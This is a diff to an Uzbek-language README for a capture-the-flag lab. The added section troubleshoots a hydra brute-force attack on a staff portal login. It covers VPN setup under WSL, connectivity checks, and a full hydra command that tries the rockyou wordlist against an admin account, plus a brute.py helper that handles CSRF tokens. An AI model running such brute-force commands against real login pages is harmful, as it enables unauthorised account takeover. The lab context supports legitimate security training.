@@ -159,6 +159,83 @@ pkill -f mock_server.py
 
 ## Muammolarni bartaraf etish
 
+### A) hydra `cannot connect` / `all children were disabled` — ENG KO'P UCHRAYDIGAN
+
+Bu **tarmoq** muammosi, hydra yoki wordlist muammosi EMAS. Alomat:
+```
+[ERROR] Child with pid ... terminating, cannot connect
+[ERROR] all children were disabled due too many connection errors
+0 of 1 target completed, 0 valid password found
+```
+Ya'ni mashinangizdan `10.15.0.238:9004` ga **route yo'q** — HTB lab VPN
+ulanmagan. Birinchi navbatda tekshiring:
+
+```bash
+cd ctf/brute-force-staff-portal
+./connectivity_check.sh              # yoki: TARGET=10.15.1.54 ./connectivity_check.sh
+```
+
+`tun` interfeysi yo'q / TCP UNREACHABLE bo'lsa — VPN'ni **WSL ichida** ishga
+tushiring (Windows'da emas — WSL2 NAT'i Windows VPN'ini ko'rmaydi):
+
+```bash
+# .ovpn faylini HTB'dan yuklab oling, so'ng WSL (Kali) ichida:
+sudo openvpn --config ~/htb.ovpn
+# "Initialization Sequence Completed" chiqishini kuting (terminalni yopmang)
+```
+
+Keyin boshqa terminalda:
+```bash
+ip a | grep tun                     # tun0 ko'rinishi kerak
+nc -vz 10.15.0.238 9004             # "succeeded!" bo'lishi kerak
+```
+
+**Muqobil:** Windows OpenVPN ishlatmoqchi bo'lsangiz, WSL2'da mirrored
+networking yoqing — `C:\Users\<siz>\.wslconfig` faylga:
+```ini
+[wsl2]
+networkingMode=mirrored
+```
+so'ng PowerShell'da `wsl --shutdown`, WSL'ni qayta oching.
+
+**Ikkinchi IP'ni ham sinab ko'ring:** challenge'da mashina IP `10.15.1.54`,
+Target esa `10.15.0.238` deb yozilgan — ikkalasiga ham urinib ko'ring:
+```bash
+TARGET=10.15.1.54 PORT=9004 ./connectivity_check.sh
+hydra -l admin -P /usr/share/wordlists/rockyou.txt -s 9004 -t 4 -f -I \
+      10.15.1.54 http-post-form "/login:username=^USER^&password=^PASS^:F=Invalid"
+```
+
+### B) Hydra restore fayli haqida ogohlantirish
+`[WARNING] Restorefile ... from a previous session found` — oldingi sessiya
+qoldig'i. `-I` qo'shsangiz o'tkazib yuboradi:
+`hydra -I -l admin -P ...`
+
+### C) Ulanadi, lekin urinishlar "noto'g'ri" bo'lib qolsa
+`FAIL_STRING` noto'g'ri. Recon'dagi haqiqiy xato matnini ishlating
+(masalan `Invalid credentials`), yoki `--success 'HTB{'` bilan sinab ko'ring.
+
+### D) Hydra 0 natija (lekin ulanadi)
+Form maydon nomlari/`action` yo'li mos emas. `brute.py` bilan tekshiring —
+u CSRF va cookie'ni o'zi boshqaradi:
+`python3 brute.py --csrf-field csrf ...`
+
+### E) 403 / blok
+Formada CSRF bor: `brute.py --csrf-field csrf` ishlating.
+
+### F) Judayam sekin
+`-t` (hydra) yoki `--threads` (python) ni oshiring. Labda rate-limit yo'q.
+Ammo "cannot connect" chiqsa, avval **A** bandini hal qiling.
+
+### G) `brute.py: No such file or directory`
+Skript GitHub'dagi repo ichida. Uni yuklab oling:
+```bash
+git clone https://github.com/dilshodgofurov161-ui/Global_AI_Server.git
+# yoki faqat papkani: ctf/brute-force-staff-portal/
+```
+Yoki umuman kerak emas — **hydra A dan keyin yetarli**.
+
+
 - **Barcha urinishlar "xato" bo'lsa** — `FAIL_STRING` noto'g'ri. Recon'dagi
   haqiqiy xato matnini ishlating, yoki `--success 'HTB{'` bilan urinib ko'ring.
 - **Hydra 0 natija** — form maydon nomlari/`action` yo'li mos emas. `brute.py`
